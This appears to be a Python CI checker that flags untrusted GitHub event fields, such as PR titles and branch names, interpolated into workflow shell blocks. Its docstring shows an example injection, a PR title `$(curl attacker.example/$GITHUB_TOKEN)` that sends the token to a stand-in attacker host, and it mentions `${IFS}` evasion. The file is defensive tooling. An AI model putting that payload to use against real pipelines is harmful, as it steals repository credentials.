#!/usr/bin/env python3
"""Forbid GitHub expression interpolation of untrusted event data into shell.

The defect this exists to prevent
--------------------------------
A workflow that writes

    run: |
      TITLE="${{ github.event.pull_request.title }}"

does not pass the title to the shell as data. GitHub substitutes the expression
*as text* before the shell parses the line, so the surrounding quotes are not
shell quoting of the title -- they are part of a script the title can end. A
title of `x$(curl attacker.example/$GITHUB_TOKEN)y` runs that command on the
runner, and a pull-request title is controllable by anyone who can open a PR.

Measured on this repository, 2026-08-15: PR #2168, titled
`... pub const Name(T) = struct ...`, made the `extract-issue` job fail with
`syntax error near unexpected token '('`. The parenthesis only produced a syntax
error; `$(...)` in the same position executes.

Why a checker rather than a rule people remember
------------------------------------------------
The interpolation reads as if it were quoted. It looks correct in review and it
stays correct-looking after the next copy-paste. Nothing in CI reports it, so the
defect is invisible until a title happens to contain shell syntax -- which is how
this one was found, by accident, after living in the tree.

The safe form is `env:`, where the runner sets the variable and no content of the
value can be parsed as code:

    - env:
        PR_TITLE: ${{ github.event.pull_request.title }}
      run: |
        printf '%s' "$PR_TITLE" > title.txt        # data, not script

Two severities, both with the list written out in code
------------------------------------------------------
`UNTRUSTED` fields are strings an outside party chooses. Interpolating one into a
`run:` block is an error.

`SUSPECT` fields are event data that is not free-form attacker text -- numbers,
enumerated actions, event names. Interpolating them is still the wrong habit,
because the next field added to that line will be a string, but it is reported as
a warning so this check does not have to be silenced to land unrelated work. A
check that must be silenced is a check that will be.

The lists are enumerated, not inferred. A pattern like "anything ending in
`.title`" stops covering a field the moment someone reaches for `.body`.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

WORKFLOW_DIR = Path(".github/workflows")

UNTRUSTED = {
    "github.event.issue.title": "issue title, free text from the opener",
    "github.event.issue.body": "issue body, free text from the opener",
    "github.event.pull_request.title": "PR title, free text from the opener",
    "github.event.pull_request.body": "PR body, free text from the opener",
    "github.event.pull_request.head.ref": (
        "PR source branch name; git permits $ ( ) ` ; | & and quotes in a "
        "refname, and ${IFS} substitutes for the space git does forbid"
    ),
    "github.event.pull_request.head.label": "fork:branch, contains the branch name",
    "github.event.pull_request.head.repo.full_name": "fork owner's chosen repo name",
    "github.event.comment.body": "comment text, free text from the commenter",
    "github.event.review.body": "review text, free text from the reviewer",
    "github.event.head_commit.message": "commit message, free text from the author",
    "github.event.workflow_run.head_branch": "branch name from the upstream run",
    "github.head_ref": "PR source branch name (same exposure as head.ref)",
    "github.event.pull_request.user.login": "account name, chosen at signup",
    "github.actor": "account name, chosen at signup",
}

SUSPECT = {
    "github.event_name": "closed set of event names",
    "github.event.action": "closed set of action names",
    "github.event.issue.number": "integer",
    "github.event.pull_request.number": "integer",
    "github.event.pull_request.head.sha": "40 hex characters",
    "github.ref_name": (
        "branch or tag of the run itself; on push it is a name someone with "
        "write access chose, so still data, though not a fork's"
    ),
    "github.event.repository.updated_at": "timestamp",
    "github.event.inputs": "workflow_dispatch input, supplied by a trusted user",
    "github.base_ref": "PR target branch; a branch of this repository, not the fork's",
    "github.ref": "fully qualified ref of the run itself",
    "github.sha": "40 hex characters",
    "github.repository": "owner/name of this repository",
    "github.run_id": "integer",
    "github.run_number": "integer",
    "github.workspace": "runner path",
    "github.workflow": "workflow name from this repository's tree",
}

EXPR = re.compile(r"\$\{\{\s*([^}]+?)\s*\}\}")


def run_blocks(text: str):
    """Yield (line_number, block_text) for every `run:` block in a workflow.

    Deliberately textual. Loading the YAML would resolve the block scalar and
    lose line numbers, and one workflow in this repository does not parse as YAML
    at all -- a checker that cannot read a broken file cannot report it.
    """
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        m = re.match(r"^(\s*)-?\s*run:\s*([|>].*)?$", lines[i])
        if not m:
            m1 = re.match(r"^(\s*)-?\s*run:\s*(\S.*)$", lines[i])
            if m1 and not m1.group(2).startswith(("|", ">")):
                yield i + 1, m1.group(2)
            i += 1
            continue
        indent = len(m.group(1))
        body, start = [], i + 1
        i += 1
        while i < len(lines):
            ln = lines[i]
            if ln.strip() and (len(ln) - len(ln.lstrip())) <= indent:
                break
            body.append(ln)
            i += 1
        yield start, "\n".join(body)


TOKEN = re.compile(r"\b(github(?:\.[A-Za-z_][A-Za-z0-9_]*)+)")


def classify(expr: str):
    """Return ('untrusted'|'suspect'|None, reason) for a whole expression.

    An expression is not always a single field. `github.event_name ==
    'pull_request' && github.base_ref || 'master'` mentions three contexts, and an
    earlier version of this checker read only the leading token, fell through to
    the catch-all, and reported that line as untrusted. That false positive
    matters more than it looks: the first thing a false positive buys is a
    silenced check, which this file's own docstring argues against.

    So every `github.*` token in the expression is classified and the worst
    severity wins. Unknown `github.event.*` tokens stay untrusted -- a field
    nobody has classified is a field nobody has thought about.
    """
    worst, reason = None, ""
    for tok in TOKEN.findall(expr):
        sev, why = classify_token(tok)
        if sev == "untrusted":
            return sev, why
        if sev == "suspect" and worst is None:
            worst, reason = sev, why
    return worst, reason


def classify_token(tok: str):
    """Classify one `github.…` token. Longest listed prefix wins."""
    for table, sev in ((UNTRUSTED, "untrusted"), (SUSPECT, "suspect")):
        for key, why in table.items():
            if tok == key or tok.startswith(key + "."):
                return sev, why
    if tok.startswith("github.event"):
        return "untrusted", "unclassified github.event field -- add it to a list above"
    return None, ""


def main() -> int:
    errors, warnings = [], []
    files = sorted(WORKFLOW_DIR.glob("*.yml")) + sorted(WORKFLOW_DIR.glob("*.yaml"))
    if not files:
        print("FAIL: no workflow files found -- wrong working directory?")
        return 2

    for path in files:
        text = path.read_text(encoding="utf-8", errors="replace")
        for lineno, block in run_blocks(text):
            for m in EXPR.finditer(block):
                sev, why = classify(m.group(1))
                if sev is None:
                    continue
                off = block[: m.start()].count("\n")
                item = (f"{path}:{lineno + off}", m.group(1).strip(), why)
                (errors if sev == "untrusted" else warnings).append(item)

    for where, expr, why in warnings:
        print("warning: %s: ${{ %s }} in run: -- %s" % (where, expr, why))
    if warnings:
        print("%d warning(s): event data interpolated into shell, not "
              "attacker-controlled. Move to env: when touching these lines."
              % len(warnings))
        print()

    if errors:
        print("FAIL: %d untrusted interpolation(s) into a shell script:" % len(errors))
        for where, expr, why in errors:
            print("  %s" % where)
            print("    ${{ %s }}" % expr)
            print("    %s" % why)
        print()
        print('Fix: pass the value through `env:` and read it as "$VAR". The runner')
        print("sets an env value, so no content of it can be parsed as shell code.")
        print("Do not escape or strip characters instead: a denylist of shell")
        print("metacharacters is a guess about a grammar, and the grammar has more")
        print("ways to say the same thing than the denylist has entries.")
        return 1

    print("OK: %d workflow(s), no untrusted event data interpolated into a run: "
          "block." % len(files))
    print("Scope: interpolation into shell only. It does not check interpolation")
    print("into `github-script`, into JSON or YAML written by a step, or into any")
    print("other interpreter downstream.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
